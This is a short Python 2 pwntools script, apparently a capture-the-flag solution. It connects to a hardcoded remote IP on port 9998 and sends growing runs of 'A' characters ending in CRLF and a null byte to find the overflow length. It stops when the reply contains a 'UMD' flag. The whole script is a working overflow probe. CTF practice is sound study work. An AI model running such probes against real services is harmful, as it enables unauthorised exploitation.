from pwn import *
for i in range(60,90):
	p=remote("192.241.138.174",9998)
	p.recvuntil("message:")
	payload="A"*i+"\r\n\x00"
	p.sendline(payload)
	data=p.recvuntil("""                ||     ||
""")
	if "UMD" in data :
		log.info("Fouuuuund at: "+str(i))
		print data
		break
	p.close()
